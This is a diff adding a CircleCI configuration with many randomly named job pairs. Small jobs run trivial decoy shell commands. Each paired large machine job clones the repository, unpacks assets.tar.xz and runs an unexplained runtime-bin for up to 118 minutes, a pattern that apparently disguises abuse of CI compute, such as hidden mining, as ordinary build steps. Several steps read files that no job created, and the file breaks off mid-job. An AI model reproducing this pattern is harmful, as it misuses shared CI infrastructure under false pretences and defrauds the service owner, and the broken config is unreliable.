@@ -1,0 +1,1510 @@
+version: 2.1
+
+jobs:
+  Light-Slot-Port:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: dr site promotion gate
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; echo done > "/tmp/mount.txt" && cp "/tmp/mount.txt" /tmp/matrixSprint.bak && diff "/tmp/mount.txt" /tmp/matrixSprint.bak && echo identical; true ; } > /tmp/handoff-post/wilLoWrecEIPT
+            echo "gate API-778: $(wc -c </tmp/handoff-post/wilLoWrecEIPT) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'wilLoWrecEIPT'
+  API-778:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/TELajLM
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  calcTabRankBadge:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Finally zip the output bucket
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; locale -a | awk '{print length, $0}' | sort -u; true ; } > /tmp/handoff-post/PhotoNHeath
+            echo "gate rollout: $(wc -c </tmp/handoff-post/PhotoNHeath) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'PhotoNHeath'
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/PhotoNHeath
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  unwrapWindow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: edge node rollout
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; stat -c %s /etc/*.conf | sort --numeric-sort | tail -n 1; true ; } > /tmp/handoff-post/TENANT_BLUE_BLOB_AZURE
+            echo "gate rigel-ng: $(wc -c </tmp/handoff-post/TENANT_BLUE_BLOB_AZURE) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'TENANT_BLUE_BLOB_AZURE'
+  rigel-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/TENANT_BLUE_BLOB_AZURE
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  armor-trait-stale-rollback:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: DRAFT STATUS UPDATE
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; for p in milk split project garlic demo; do echo ${#p}; done; true ; } > /tmp/handoff-post/MothSilverNickel
+            echo "gate titan: $(wc -c </tmp/handoff-post/MothSilverNickel) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'MothSilverNickel'
+  titan:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/MothSilverNickel
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  execFlag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Wait for the sidebar to appear
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; grep -icrw alias /usr/share/doc/bash | nl | head -n 8; true ; } > /tmp/handoff-post/38eb7d274414e5bfa3f77cc0e00168e37767
+            echo "gate feat-8203: $(wc -c </tmp/handoff-post/38eb7d274414e5bfa3f77cc0e00168e37767) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - '38eb7d274414e5bfa3f77cc0e00168e37767'
+  feat-8203:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/38eb7d274414e5bfa3f77cc0e00168e37767
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  o-brand:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: isolation vs approval
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; echo 49176 | factor; true ; } > /tmp/handoff-post/vacr9
+            echo "gate py311-release: $(wc -c </tmp/handoff-post/vacr9) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'vacr9'
+  py311-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/126.202.73
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  PHResource:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: BalanceFogVolumes
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; function half() { for a in "$@"; do echo "[$a]"; done; }; half rack forum export; true ; } > /tmp/handoff-post/seed_576
+            echo "gate sanity: $(wc -c </tmp/handoff-post/seed_576) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'seed_576'
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/38eb7d274414e5bfa3f77cc0e00168e37767
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  Step-BackupView:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Then bind the wifi mesh
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; for w in $(seq 1 7); do echo $w; done; true ; } > /tmp/handoff-post/XDHUW7CgbDuNwRGMW
+            echo "gate feat-6359: $(wc -c </tmp/handoff-post/XDHUW7CgbDuNwRGMW) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'XDHUW7CgbDuNwRGMW'
+  feat-6359:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/XDHUW7CgbDuNwRGMW
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  quinninator:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: escalation 202610
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; ps aux | head -2 | tail -n +2; true ; } > /tmp/handoff-post/REF-2020-46755
+            echo "gate dec13-smoke: $(wc -c </tmp/handoff-post/REF-2020-46755) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'REF-2020-46755'
+  dec13-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/REF-2020-46755
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  enqueue_scripts_instance:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Warning during go live
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; for k in zebra wolf cat whale; do echo $k;done; true ; } > /tmp/handoff-post/o2IrJGjic
+            echo "gate prometheus-beta: $(wc -c </tmp/handoff-post/o2IrJGjic) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'o2IrJGjic'
+  prometheus-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/o2IrJGjic
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  d2uv7j:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: l 14 damaged goods staging
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 2 -name "*.list" -exec echo "{}" ';' 2>/dev/null | nl; true ; } > /tmp/handoff-post/red_payload_river_kappa
+            echo "gate ShipTests: $(wc -c </tmp/handoff-post/red_payload_river_kappa) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'red_payload_river_kappa'
+  ShipTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/red_payload_river_kappa
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  UTF8v7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: DOUBLE CHECK GOLDEN FILES MANUAL
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd > "/tmp/cinema.gz" && zgrep -c nologin "/tmp/cinema.gz"; true ; } > /tmp/handoff-post/wd
+            echo "gate fx-01: $(wc -c </tmp/handoff-post/wd) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'wd'
+  fx-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/wd
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  bot4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Start of shift check in with finance
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; readlink /proc/$$/exe; true ; } > /tmp/handoff-post/206.39
+            echo "gate beta-v5: $(wc -c </tmp/handoff-post/206.39) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - '206.39'
+  beta-v5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/206.39
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  sierra_alfa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Besiege the ops channel
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; tail -n 5 /etc/group | awk -F':' '{ print $1, $3 }' | nl | wc -l; true ; } > /tmp/handoff-post/PO-4609-QG
+            echo "gate run-staging-integration-tests: $(wc -c </tmp/handoff-post/PO-4609-QG) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'PO-4609-QG'
+  run-staging-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/126.202.73
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  device_unlock_eager:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Here I drag the cart icon
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; ls /usr/share | tail -n 4 | fmt -w 48; true ; } > /tmp/handoff-post/TELajLM
+            echo "gate java17-fmt: $(wc -c </tmp/handoff-post/TELajLM) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'TELajLM'
+  java17-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/TELajLM
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  NNKV-3266:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Pull sha 75f8a5
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; grep -l -r if /etc/profile.d | wc -l; true ; } > /tmp/handoff-post/47om.f3n
+            echo "gate q1-release: $(wc -c </tmp/handoff-post/47om.f3n) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - '47om.f3n'
+  q1-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/47om.f3n
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  armor-8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Crash reports shredded successfully
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,papaya,19,63.70\n2,pear,3,67.67\n3,lime,15,46.87\n4,banana,4,37.27\n' >"/tmp/golden-route.txt" && sort -t, -k4 -rn "/tmp/golden-route.txt" | head -n 2; true ; } > /tmp/handoff-post/draft_868f
+            echo "gate q4-cleanup: $(wc -c </tmp/handoff-post/draft_868f) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'draft_868f'
+  q4-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/draft_868f
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  Xi1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: canary early adopter alert
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/go3" && head -c 13383 /dev/urandom > "/tmp/go3"/blob && du -sh "/tmp/go3"; true ; } > /tmp/handoff-post/HARBOR
+            echo "gate go-live: $(wc -c </tmp/handoff-post/HARBOR) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'HARBOR'
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/HARBOR
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  canyon-mutex-hook-frost:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Weigh Calibration Beads And Rinse
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; type -t sort; true ; } > /tmp/handoff-post/126.202.73
+            echo "gate mike: $(wc -c </tmp/handoff-post/126.202.73) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - '126.202.73'
+  mike:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/126.202.73
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  hf2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: normalization TAKE TWO
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; if test -e /etc/fstab; then echo true; else echo 'false'; fi; true ; } > /tmp/handoff-post/61.171.240
+            echo "gate bob-run: $(wc -c </tmp/handoff-post/61.171.240) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - '61.171.240'
+  bob-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/61.171.240
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  vompspuellkeesi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Produce
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; ls -p -h --indicator-style=slash /etc/security|awk '{print length, $0}'|sort -n|tail -n 3; true ; } > /tmp/handoff-post/seed-17p
+            echo "gate QA_MERGE_3: $(wc -c </tmp/handoff-post/seed-17p) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'seed-17p'
+  QA_MERGE_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/seed-17p
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  hotfix_paint_packet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Compliance handles unlock
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; sed -n "4,9p" /etc/profile; true ; } > /tmp/handoff-post/LOT-2021-61382
+            echo "gate blast-off: $(wc -c </tmp/handoff-post/LOT-2021-61382) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'LOT-2021-61382'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/LOT-2021-61382
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  DZ_Q:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: The primary node is empty
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; if command -v grep &>/dev/null ; then echo "grep found"; fi; true ; } > /tmp/handoff-post/k
+            echo "gate Launch_Release1: $(wc -c </tmp/handoff-post/k) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'k'
+  Launch_Release1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/k
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  footer_pattern_classes_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Deliver rotation value
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; printf 'studio\t41\nriver\t66\nsector\t88\nbackup\t83\n' >'/tmp/r.dat' && awk -F'\t' '{print $2}' '/tmp/r.dat'; true ; } > /tmp/handoff-post/trace-7a63a5.log
+            echo "gate europa-final: $(wc -c </tmp/handoff-post/trace-7a63a5.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'trace-7a63a5.log'
+  europa-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/trace-7a63a5.log
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  jogmw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Level XII Checkpointing Inference Server
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 3 -name "default" -empty -links +1 -exec echo {} + 2>/dev/null|cat -n; true ; } > /tmp/handoff-post/dFyRlhJgSgrOfWkqbJ
+            echo "gate rc-v4: $(wc -c </tmp/handoff-post/dFyRlhJgSgrOfWkqbJ) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'dFyRlhJgSgrOfWkqbJ'
+  rc-v4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/dFyRlhJgSgrOfWkqbJ
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  vpn034:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: To free memory quarantine the secrets
+          command: |
+            mkdir -p /tmp/handoff-post
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 3 -mindepth 1 -uid 0 -exec echo "{}" ";" 2>/dev/null | nl; true ; } > /tmp/handoff-post/proxy
+            echo "gate zed-push: $(wc -c </tmp/handoff-post/proxy) bytes total"
+      - persist_to_workspace:
+          root: /tmp/handoff-post
+          paths:
+            - 'proxy'
+  zed-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff-post
+      - run:
+          name: Check 5
+          command: |
+            cat /tmp/handoff-post/proxy
+      - run:
+          name: Load source
+          command: git clone --depth 1 -q --no-single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz -f assets.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: $PWD/runtime-bin
+  acquire_ratio_fails:
+    docker:
+      - image: cimg/base:current
